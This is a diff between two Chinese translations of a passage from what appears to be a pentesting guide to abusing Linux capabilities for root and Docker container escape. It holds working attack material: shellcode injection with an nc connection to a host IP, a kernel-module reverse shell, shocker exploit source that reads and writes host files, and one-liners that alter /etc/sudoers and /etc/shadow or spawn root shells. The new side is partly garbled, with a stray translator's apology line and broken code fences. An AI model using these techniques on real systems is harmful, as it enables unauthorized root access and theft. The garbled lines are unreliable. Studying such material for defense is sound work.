 Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -676,55 +613,57 @@ uid=0(root)
 gid=0(root)
 groups=0(root
 ```
-列出在主机上运行的进程 `ps -eaf`
+列出在**主机**上运行的**进程** `ps -eaf`
 
-1. 获取架构 `uname -m`
-2. 找到适用于该架构的 shellcode ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
-3. 找到一个将 shellcode 注入到进程内存中的程序 ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
-4. 修改程序中的 shellcode 并编译它 `gcc inject.c -o inject`
-5. 注入并获取 shell：`./inject 299; nc 172.17.0.1 5600`
+1. 获取**架构** `uname -m`
+2. 寻找适合该架构的**shellcode** ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
+3. 找到一个**程序**来将**shellcode**注入进程内存 ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
+4. **修改**程序中的**shellcode**并**编译**它 `gcc inject.c -o inject`
+5. **注入**并获取你的**shell**：`./inject 299; nc 172.17.0.1 5600`
 
-## CAP\_SYS\_MODULE
+## CAP_SYS_MODULE
 
-[**CAP\_SYS\_MODULE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程加载和卸载任意内核模块（`init_module(2)`、`finit_module(2)` 和 `delete_module(2)` 系统调用）。这可能导致简单的特权升级和 ring-0 损害。内核可以随意修改，从而破坏所有系统安全性、Linux 安全模块和容器系统。\
-**这意味着您可以在主机机器的内核中插入/删除内核模块。**
+[**CAP_SYS_MODULE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程加载和卸载任意内核模块（`init_module(2)`、`finit_module(2)` 和 `delete_module(2)` 系统调用）。这可能导致简单的权限提升和 ring-0 妥协。内核可以随意修改，颠覆所有系统安全、Linux 安全模块和容器系统。\
+**这意味着你可以** **在主机的内核中插入/移除内核模块。**
 
-**使用二进制文件的示例**
+**二进制示例**
 
-在下面的示例中，二进制文件 **`python`** 具有此能力。
+在以下示例中，二进制文件 **`python`** 具有此能力。
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_module+ep
 ```
 默认情况下，**`modprobe`** 命令会在目录 **`/lib/modules/$(uname -r)`** 中检查依赖列表和映射文件。\
-为了利用这一点，让我们创建一个假的 **lib/modules** 文件夹：
+为了滥用这一点，让我们创建一个假的 **lib/modules** 文件夹：
 ```bash
 mkdir lib/modules -p
 cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
 ```
-然后**编译内核模块，你可以在下面找到2个示例，并将其复制**到此文件夹中：
+然后**编译内核模块，下面有2个示例，然后复制**到这个文件夹：
 ```bash
 cp reverse-shell.ko lib/modules/$(uname -r)/
 ```
-最后，执行所需的Python代码来加载此内核模块：
+最后，执行所需的python代码来加载这个内核模块：
 ```python
 import kmod
 km = kmod.Kmod()
 km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
 km.modprobe("reverse-shell")
 ```
-**二进制文件示例**
+**示例 2 中的二进制文件**
 
-在下面的示例中，二进制文件 **`kmod`** 具有这个能力。
+在以下示例中，二进制文件 **`kmod`** 具有此能力。
 ```bash
 getcap -r / 2>/dev/null
 /bin/kmod = cap_sys_module+ep
 ```
-这意味着可以使用命令**`insmod`**来插入内核模块。按照下面的示例来滥用这个特权获取**反向 shell**。
+```markdown
+这意味着可以使用命令 **`insmod`** 来插入一个内核模块。按照下面的例子操作，通过滥用这个权限来获取一个**反向 shell**。
 
-**使用环境示例（Docker 越狱）**
+**带环境的例子（Docker breakout）**
 
-您可以使用以下命令检查 Docker 容器中启用的能力：
+你可以使用以下命令检查 Docker 容器内启用的 capabilities：
+```
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -737,9 +676,9 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-在上面的输出中，您可以看到已启用了**SYS\_MODULE**功能。
+在前面的输出中，您可以看到 **SYS\_MODULE** 能力已启用。
 
-**创建**一个将执行反向shell的**内核模块**，并创建**Makefile**来**编译**它：
+**创建** 将要执行反向 shell 的 **内核模块** 和 **Makefile** 以 **编译** 它：
 
 {% code title="reverse-shell.c" %}
 ```c
@@ -765,7 +704,11 @@ printk(KERN_INFO "Exiting\n");
 module_init(reverse_shell_init);
 module_exit(reverse_shell_exit);
 ```
+```markdown
+{% endcode %}
+
 {% code title="Makefile" %}
+```
 ```bash
 obj-m +=reverse-shell.o
 
@@ -778,17 +721,17 @@ make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 {% endcode %}
 
 {% hint style="warning" %}
-在 Makefile 中，每个 make 单词前的空格必须是制表符，而不是空格！
+Makefile 中每个 make 单词前的空白字符**必须是制表符，而不是空格**！
 {% endhint %}
 
-执行 `make` 命令进行编译。
+执行 `make` 来编译它。
 ```
 ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.
 
 sudo apt update
 sudo apt full-upgrade
 ```
-最后，在一个shell中启动`nc`并从另一个shell中**加载模块**，然后你将捕获到`nc`进程中的shell：
+最后，在一个shell中启动`nc`，并且从另一个shell中**加载模块**，你将在nc进程中捕获到shell：
 ```bash
 #Shell 1
 nc -lvnp 4444
@@ -796,41 +739,42 @@ nc -lvnp 4444
 #Shell 2
 insmod reverse-shell.ko #Launch the reverse shell
 ```
-**这种技术的代码是从**[**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **的"滥用SYS\_MODULE能力"实验室中复制的**
+**此技术的代码摘自“滥用 SYS_MODULE 能力”实验室，来自** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
 
-这种技术的另一个例子可以在[https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)中找到
+此技术的另一个例子可以在 [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) 找到
 
-## CAP\_DAC\_READ\_SEARCH
+## CAP_DAC_READ_SEARCH
 
-[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html)允许进程**绕过文件读取和目录读取执行权限**。虽然它被设计用于搜索或读取文件，但它也授予进程使用`open_by_handle_at(2)`的权限。任何具有`CAP_DAC_READ_SEARCH`能力的进程都可以使用`open_by_handle_at(2)`来访问任何文件，甚至是在其挂载命名空间之外的文件。传递给`open_by_handle_at(2)`的句柄是一个不透明的标识符，可以使用`name_to_handle_at(2)`检索。然而，这个句柄包含敏感且可篡改的信息，比如inode号。Sebastian Krahmer首次在Docker容器中展示了这个问题，使用了[shocker](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)漏洞利用。
+[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程**绕过文件读取，以及目录读取和执行权限**。虽然这是为了搜索或读取文件而设计的，但它也授予进程权限调用 `open_by_handle_at(2)`。任何具有 `CAP_DAC_READ_SEARCH` 能力的进程都可以使用 `open_by_handle_at(2)` 访问任何文件，即使是那些位于其挂载命名空间之外的文件。传递给 `open_by_handle_at(2)` 的句柄本意是作为一个使用 `name_to_handle_at(2)` 检索到的不透明标识符。然而，这个句柄包含敏感且可篡改的信息，如 inode 编号。这最初是由 Sebastian Krahmer 通过 [shocker](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) 漏洞展示的问题。
+**这意味着你可以** **绕过文件读取权限检查以及目录读取/执行权限检查。**
 
-**这意味着你可以绕过文件读取权限检查和目录读取/执行权限检查。**
+**带二进制文件的示例**
 
-**使用二进制文件的例子**
-
-该二进制文件将能够读取任何文件。因此，如果像tar这样的文件具有这个能力，它将能够读取shadow文件：
+二进制文件将能够读取任何文件。因此，如果像 tar 这样的文件具有这种能力，它将能够读取 shadow 文件：
 ```bash
 cd /etc
 tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
 cd /tmp
 tar -cxf shadow.tar.gz
 ```
-**使用binary2的示例**
+**示例 binary2**
 
-在这种情况下，假设**`python`**二进制文件具有此能力。为了列出根目录下的文件，你可以执行以下操作：
+在这个例子中，假设 **`python`** 二进制文件具有这种能力。为了列出 root 文件，你可以执行：
 ```python
 import os
 for r, d, f in os.walk('/root'):
 for filename in f:
 print(filename)
 ```
-而要读取一个文件，你可以执行以下操作：
+```markdown
+而要读取文件，你可以执行：
+```
 ```python
 print(open("/etc/shadow", "r").read())
 ```
-**环境中的示例（Docker越狱）**
+**环境示例（Docker breakout）**
 
-您可以使用以下命令检查Docker容器中启用的能力：
+您可以使用以下命令检查 Docker 容器内启用的 capabilities：
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -843,11 +787,11 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-在先前的输出中，您可以看到启用了**DAC\_READ\_SEARCH**权限。因此，容器可以**调试进程**。
+在前面的输出中，您可以看到 **DAC\_READ\_SEARCH** 能力被启用。因此，容器可以**调试进程**。
 
-您可以在[https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)中了解以下利用方式，但简而言之，**CAP\_DAC\_READ\_SEARCH**不仅允许我们在没有权限检查的情况下遍历文件系统，还明确删除了对**open\_by\_handle\_at(2)**的任何检查，并且**可能允许我们的进程访问其他进程打开的敏感文件**。
+您可以在 [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) 学习以下利用方法的工作原理，但总结来说，**CAP\_DAC\_READ\_SEARCH** 不仅允许我们在没有权限检查的情况下遍历文件系统，而且还明确地移除了对 _**open\_by\_handle\_at(2)**_ 的任何检查，并且**可能允许我们的进程打开其他进程打开的敏感文件**。
 
-滥用这些权限以从主机读取文件的原始利用方式可以在此处找到：[http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)，以下是一个**修改后的版本，允许您指定要读取的文件作为第一个参数，并将其转储到文件中**。
+原始利用这些权限从宿主机读取文件的漏洞可以在这里找到：[http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)，以下是一个**修改过的版本，允许您指示您想要读取的文件作为第一个参数，并将其转储到一个文件中。**
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -998,47 +942,47 @@ return 0;
 }
 ```
 {% hint style="warning" %}
-我需要利用一个指针来找到主机上挂载的某个文件。原始的利用代码使用的是 /.dockerinit 文件，而这个修改后的版本使用的是 /etc/hostname 文件。如果利用代码不起作用，可能需要设置一个不同的文件。要找到在主机上挂载的文件，只需执行 mount 命令：
+利用需要找到一个指向主机上已挂载内容的指针。原始利用使用的是文件 /.dockerinit，而这个修改版本使用的是 /etc/hostname。如果利用不起作用，可能需要设置不同的文件。要找到一个在主机上已挂载的文件，只需执行 mount 命令：
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (407) (1).png>)
 
-**这个技术的代码是从 "Abusing DAC\_READ\_SEARCH Capability" 实验室中复制的** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
+**此技术的代码是从 "Abusing DAC\_READ\_SEARCH Capability" 实验室复制的，来源于** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
 
 ​
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) 是西班牙最重要的网络安全活动之一，也是欧洲最重要的网络安全活动之一。作为促进技术知识的使命，这个大会是技术和网络安全专业人士在各个领域的热点交流之地。
+​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) 是**西班牙**最重要的网络安全活动，也是**欧洲**最重要的活动之一。以**推广技术知识**为使命，这个大会是技术和网络安全专业人士在各个学科的沸腾交汇点。
 
 {% embed url="https://www.rootedcon.com/" %}
 
 ## CAP\_DAC\_OVERRIDE
 
-**这意味着您可以绕过对任何文件的写入权限检查，因此可以写入任何文件。**
+**这意味着你可以绕过对任何文件的写权限检查，因此你可以写任何文件。**
 
-有很多文件可以**覆盖以提升权限**，[**您可以从这里获取一些想法**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。
+有很多文件你可以**覆盖以提升权限，**[**你可以从这里获取灵感**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。
 
-**使用二进制文件的示例**
+**示例与二进制**
 
-在这个示例中，vim 具有这个能力，所以您可以修改任何文件，如 passwd、sudoers 或 shadow：
+在此示例中，vim 具有此能力，因此你可以修改任何文件，如 _passwd_、_sudoers_ 或 _shadow_：
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/vim = cap_dac_override+ep
 
 vim /etc/sudoers #To overwrite it
 ```
-**二进制文件2的示例**
+**示例二**
 
-在这个示例中，**`python`**二进制文件将具有此能力。您可以使用python来覆盖任何文件：
+在此示例中，**`python`** 二进制文件将具有此能力。您可以使用 python 覆盖任何文件：
 ```python
 file=open("/etc/sudoers","a")
 file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
 file.close()
 ```
-**使用环境变量和CAP_DAC_READ_SEARCH（Docker越狱）的示例**
+**示例：环境 + CAP\_DAC\_READ\_SEARCH（Docker breakout）**
 
-您可以使用以下命令检查Docker容器中启用的能力：
+您可以使用以下命令检查 Docker 容器内启用的 capabilities：
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -1051,8 +995,8 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-首先阅读前一节中关于滥用 DAC_READ_SEARCH 权限来读取任意文件的内容，并编译该漏洞利用工具。
-然后，编译以下版本的 shocker 漏洞利用工具，它将允许您在主机文件系统中写入任意文件：
+首先阅读前一节关于[**滥用 DAC\_READ\_SEARCH 能力来读取主机的任意文件**](linux-capabilities.md#cap\_dac\_read\_search)并**编译**漏洞利用程序。\
+然后，**编译以下版本的 shocker 漏洞利用程序**，它将允许你在主机文件系统中**写入任意文件**：
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -1191,21 +1135,21 @@ close(fd1);
 return 0;
 }
 ```
-为了逃离Docker容器，你可以从主机上**下载**文件`/etc/shadow`和`/etc/passwd`，**添加**一个**新用户**，并使用**`shocker_write`**来覆盖它们。然后，通过**ssh**进行**访问**。
+为了逃离docker容器，你可以**下载**主机上的文件`/etc/shadow`和`/etc/passwd`，向它们**添加**一个**新用户**，并使用**`shocker_write`**来覆盖它们。然后，通过**ssh**进行**访问**。
 
-**这个技术的代码是从**[**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)**的"Abusing DAC\_OVERRIDE Capability"实验室中复制的**
+**此技术的代码复制自"Abusing DAC\_OVERRIDE Capability"实验室，来源于** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)
 
 ## CAP\_CHOWN
 
 **这意味着可以更改任何文件的所有权。**
 
-**使用二进制文件的示例**
+**带二进制文件的示例**
 
-假设**`python`**二进制文件具有此能力，你可以**更改**`shadow`文件的**所有者**，**更改root密码**，并提升权限：
+假设**`python`**二进制文件具有此能力，你可以**更改** **shadow**文件的**所有者**，**更改root密码**，并提升权限：
 ```bash
 python -c 'import os;os.chown("/etc/shadow",1000,1000)'
 ```
-或者使用具有此能力的 **`ruby`** 二进制文件：
+或者使用具有此功能的**`ruby`**二进制文件：
 ```bash
 ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
 ```
@@ -1213,9 +1157,9 @@ ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
 
 **这意味着可以更改任何文件的权限。**
 
-**使用二进制文件的示例**
+**二进制示例**
 
-如果Python具有此能力，您可以修改shadow文件的权限，**更改root密码**并提升特权：
+如果python具有此能力，您可以修改shadow文件的权限，**更改root密码**，并提升权限：
 ```bash
 python -c 'import os;os.chmod("/etc/shadow",0666)
 ```
@@ -1223,21 +1167,15 @@ python -c 'import os;os.chmod("/etc/shadow",0666)
 
 **这意味着可以设置创建进程的有效用户ID。**
 
-**使用二进制文件的示例**
+**二进制示例**
 
-如果Python具有此**能力**，您可以非常容易地滥用它来提升特权到root：
+如果python具有这项**能力**，你可以非常容易地滥用它来提升权限至root：
 ```python
 import os
 os.setuid(0)
 os.system("/bin/bash")
 ```
-**另一种方法：**
-
-```bash
-$ getcap -r / 2>/dev/null
-```
-
-这个命令将递归地扫描整个文件系统，并显示具有特殊能力的文件。
+**另一种方式：**
 ```python
 import os
 import prctl
@@ -1250,11 +1188,11 @@ os.system("/bin/bash")
 
 **这意味着可以设置创建进程的有效组ID。**
 
-有很多文件可以**覆盖以提升权限**，[**你可以从这里获取一些想法**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。
+有很多文件你可以**覆盖以提升权限，** [**你可以从这里获取灵感**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。
 
-**使用二进制文件的示例**
+**使用二进制文件的例子**
 
-在这种情况下，你应该寻找组可以读取的有趣文件，因为你可以冒充任何组：
+在这种情况下，你应该寻找一个组可以读取的有趣文件，因为你可以冒充任何组：
 ```bash
 #Find every file writable by a group
 find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
@@ -1263,25 +1201,25 @@ find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
 #Find every file readable by a group in /etc with a maxpath of 1
 find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
 ```
-一旦你找到了一个可以滥用的文件（通过读取或写入），以升级权限，你可以使用以下方法**模拟感兴趣的组来获取一个shell**：
+一旦你找到了一个可以滥用（通过读取或写入）来提升权限的文件，你可以通过以下方式**获取一个模拟有趣用户组的 shell**：
 ```python
 import os
 os.setgid(42)
 os.system("/bin/bash")
 ```
-在这种情况下，组`shadow`被冒充，因此您可以读取文件`/etc/shadow`：
+在这种情况下，模拟了shadow组，因此您可以读取文件`/etc/shadow`：
 ```bash
 cat /etc/shadow
 ```
-如果安装了**docker**，您可以**冒充** **docker组**并滥用它与[docker套接字进行通信并提升权限](./#writable-docker-socket)。
+如果安装了**docker**，你可以**冒充** **docker组**并滥用它与[**docker套接字**通信并提升权限](./#writable-docker-socket)。
 
 ## CAP\_SETFCAP
 
 **这意味着可以在文件和进程上设置能力**
 
-**使用二进制文件的示例**
+**二进制示例**
 
-如果python具有此**能力**，您可以很容易地滥用它来提升为root权限：
+如果python具有这个**能力**，你可以很容易地滥用它来提升权限到root：
 
 {% code title="setcapability.py" %}
 ```python
@@ -1306,19 +1244,19 @@ status = libcap.cap_set_file(path,cap_t)
 if(status == 0):
 print (cap + " was successfully added to " + path)
 ```
-{% endcode %}
+Since there is no content provided before the `{% endcode %}` tag, there is nothing to translate. Please provide the relevant English text that needs to be translated into Chinese.
 ```bash
 python setcapability.py /usr/bin/python2.7
 ```
 {% hint style="warning" %}
-请注意，如果您使用CAP\_SETFCAP为二进制文件设置了新的能力，则会丢失此能力。
+请注意，如果您使用CAP\_SETFCAP为二进制文件设置了新的能力，您将失去这个能力。
 {% endhint %}
 
-一旦您拥有[SETUID能力](linux-capabilities.md#cap\_setuid)，您可以转到其部分以查看如何提升特权。
+一旦您获得了[SETUID能力](linux-capabilities.md#cap\_setuid)，您可以转到其部分查看如何提升权限。
 
-**使用环境的示例（Docker越狱）**
+**带环境的示例（Docker breakout）**
 
-默认情况下，Docker容器内的进程被赋予了**CAP\_SETFCAP能力**。您可以通过执行以下操作来验证：
+默认情况下，**CAP\_SETFCAP能力被赋予Docker容器内的进程**。您可以通过以下操作来检查：
 ```bash
 cat /proc/`pidof bash`/status | grep Cap
 CapInh: 00000000a80425fb
@@ -1327,11 +1265,11 @@ CapEff: 00000000a80425fb
 CapBnd: 00000000a80425fb
 CapAmb: 0000000000000000
 
-apsh --decode=00000000a80425fb
+capsh --decode=00000000a80425fb
 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
 ```
-这个能力允许将**任何其他能力授予二进制文件**，因此我们可以考虑**滥用本页面中提到的任何其他能力突破**来从容器中**逃脱**。\
-然而，如果你尝试给gdb二进制文件赋予CAP\_SYS\_ADMIN和CAP\_SYS\_PTRACE的能力，你会发现你可以给予它们，但是**二进制文件在此之后将无法执行**：
+此能力允许**向二进制文件授予任何其他能力**，因此我们可以考虑通过**滥用本页提到的其他能力突破**来**逃离**容器。\
+然而，如果你尝试比如将 CAP\_SYS\_ADMIN 和 CAP\_SYS\_PTRACE 能力授予 gdb 二进制文件，你会发现你可以授予它们，但是**此后二进制文件将无法执行**：
 ```bash
 getcap /usr/bin/gdb
 /usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip
@@ -1341,25 +1279,25 @@ setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb
 /usr/bin/gdb
 bash: /usr/bin/gdb: Operation not permitted
 ```
-经过调查，我读到了这个：_Permitted: 这是一个**限制有效能力的超集**，线程可以假设。它也是一个限制有效集中的线程可以通过一个线程添加到继承集中的能力，该线程**没有CAP\_SETPCAP**能力。_\
-看起来，Permitted能力限制了可以使用的能力。\
-然而，Docker默认也授予了**CAP\_SETPCAP**，所以你可能能够**在继承集中设置新的能力**。\
-然而，在这个能力的文档中：_CAP\_SETPCAP：\[…]**将调用线程的边界集中的任何能力添加到其可继承集**。_\
-看起来，我们只能从边界集中添加到可继承集的能力。这意味着**我们不能将新的能力（如CAP\_SYS\_ADMIN或CAP\_SYS\_PTRACE）放入继承集中以提升权限**。
+在调查后，我读到这样一段：_Permitted: 这是线程可能假设的有效能力的**限制性超集**。它也是可以被线程添加到可继承集的能力的限制性超集，前提是该线程在其有效集中**没有CAP\_SETPCAP**能力。_\
+看起来Permitted能力限制了可以使用的能力。\
+然而，Docker默认也授予了**CAP\_SETPCAP**，所以你可能能够**在可继承的能力中设置新的能力**。\
+然而，在这个能力的文档中：_CAP\_SETPCAP : \[…] **从调用线程的边界集添加任何能力到其可继承集**。_\
+看起来我们只能从边界集中添加能力到可继承集。这意味着**我们不能将像CAP\_SYS\_ADMIN或CAP\_SYS\_PTRACE这样的新能力放入继承集中来提升权限**。
 
 ## CAP\_SYS\_RAWIO
 
-[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html)提供了一系列敏感操作，包括访问`/dev/mem`、`/dev/kmem`或`/proc/kcore`，修改`mmap_min_addr`，访问`ioperm(2)`和`iopl(2)`系统调用，以及各种磁盘命令。通过这个能力，也启用了`FIBMAP ioctl(2)`，这在[过去](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)引起了问题。根据手册，持有者还可以对其他设备**执行一系列特定于设备的操作**。
+[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 提供了许多敏感操作，包括访问 `/dev/mem`、`/dev/kmem` 或 `/proc/kcore`，修改 `mmap_min_addr`，访问 `ioperm(2)` 和 `iopl(2)` 系统调用，以及各种磁盘命令。通过这个能力，`FIBMAP ioctl(2)` 也被启用，这在[过去](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)曾引起问题。根据手册页，这还允许持有者描述性地`对其他设备执行一系列设备特定操作`。
 
-这对于**提升权限**和**Docker逃逸**很有用。
+这对于**权限提升**和**Docker breakout**很有用。
 
 ## CAP\_KILL
 
-**这意味着可以杀死任何进程。**
+**这意味着它可以杀死任何进程。**
 
-**使用二进制文件的示例**
+**带二进制的示例**
 
-假设**`python`**二进制文件具有这个能力。如果你还能**修改一些服务或套接字配置**（或与服务相关的任何配置文件），你可以在其中设置后门，然后杀死与该服务相关的进程，并等待新的配置文件执行你的后门。
+假设**`python`** 二进制文件具有这个能力。如果你还能**修改某些服务或套接字配置**（或任何与服务相关的配置文件），你可以对其进行后门处理，然后杀死与该服务相关的进程，并等待新的配置文件执行你的后门。
 ```python
 #Use this python code to kill arbitrary processes
 import os
@@ -1367,20 +1305,30 @@ import signal
 pgid = os.getpgid(341)
 os.killpg(pgid, signal.SIGKILL)
 ```
-**使用 kill 进行权限提升**
+**提权与kill**
 
-如果你拥有 kill 的权限，并且有一个以 root（或其他用户）身份运行的 **node 程序**，你可以尝试向其发送 **SIGUSR1 信号**，从而使其打开 node 调试器，以便你可以连接到它。
+如果你拥有kill能力，并且有一个**以root身份运行的node程序**（或作为不同用户），你可能可以向它**发送SIGUSR1信号**，使其**打开node调试器**，以便你可以连接。
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 ```
+{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
+[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
+{% endcontent-ref %}
+
+<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
+
+[**RootedCON**](https://www.rootedcon.com/) 是**西班牙**最重要的网络安全活动，也是**欧洲**最重要的活动之一。这个大会的**使命是促进技术知识的传播**，是技术和网络安全专业人士在各个领域的交流热点。
+
+{% embed url="https://www.rootedcon.com/" %}
+
 ## CAP\_NET\_BIND\_SERVICE
 
-这意味着可以在任何端口上监听（甚至是特权端口）。你不能直接通过这个能力来提升权限。
+**这意味着可以监听任何端口（包括特权端口）。** 你不能直接通过这个能力提升权限。
 
-**使用二进制文件的示例**
+**二进制示例**
 
-如果**`python`**具有这个能力，它将能够在任何端口上监听，甚至从其中连接到任何其他端口（某些服务需要从特定特权端口连接）。
+如果 **`python`** 拥有这个能力，它将能够监听任何端口，甚至可以从该端口连接到任何其他端口（一些服务要求从特定特权端口进行连接）
 
 {% tabs %}
 {% tab title="监听" %}
@@ -1394,6 +1342,8 @@ while True:
 output = connection.recv(1024).strip();
 print(output)
 ```
+{% endtab %}
+
 {% tab title="连接" %}
 ```python
 import socket
@@ -1406,22 +1356,22 @@ s.connect(('10.10.10.10',500))
 
 ## CAP\_NET\_RAW
 
-[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程能够为可用的网络命名空间创建原始和数据包套接字类型。这允许通过公开的网络接口进行任意数据包生成和传输。在许多情况下，此接口将是一个虚拟以太网设备，它可能允许恶意或被入侵的容器在各种网络层次上伪造数据包。具有此能力的恶意进程或被入侵的容器可能会注入上游桥接器，利用容器之间的路由，绕过网络访问控制，并以其他方式干扰主机网络，如果没有防火墙来限制数据包类型和内容。最后，此能力允许进程绑定到可用命名空间中的任何地址。特权容器通常保留此能力，以允许使用原始套接字从容器中创建 ICMP 请求，从而使 ping 功能正常工作。
+[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程能够为可用的网络命名空间**创建 RAW 和 PACKET 套接字类型**。这允许通过暴露的网络接口生成和传输任意数据包。在许多情况下，这个接口将是一个虚拟以太网设备，这可能允许恶意或**被攻破的容器**在各种网络层**伪造** **数据包**。拥有此能力的恶意进程或被攻破的容器可能会注入到上游桥接中，利用容器间的路由，绕过网络访问控制，并在没有防火墙限制数据包类型和内容的情况下干扰主机网络。最后，这个能力允许进程绑定到可用命名空间内的任何地址。这个能力通常由特权容器保留，以允许 ping 通过使用 RAW 套接字从容器创建 ICMP 请求来工作。
 
-**这意味着可以嗅探流量**。您不能直接利用此能力升级权限。
+**这意味着有可能嗅探流量。** 你不能直接通过这个能力提升权限。
 
-**使用二进制文件的示例**
+**带二进制文件的示例**
 
-如果二进制文件 **`tcpdump`** 具有此能力，则可以使用它来捕获网络信息。
+如果二进制文件 **`tcpdump`** 拥有这个能力，你将能够使用它来捕获网络信息。
 ```bash
 getcap -r / 2>/dev/null
 /usr/sbin/tcpdump = cap_net_raw+ep
 ```
-请注意，如果**环境**提供了这个能力，您也可以使用**`tcpdump`**来嗅探流量。
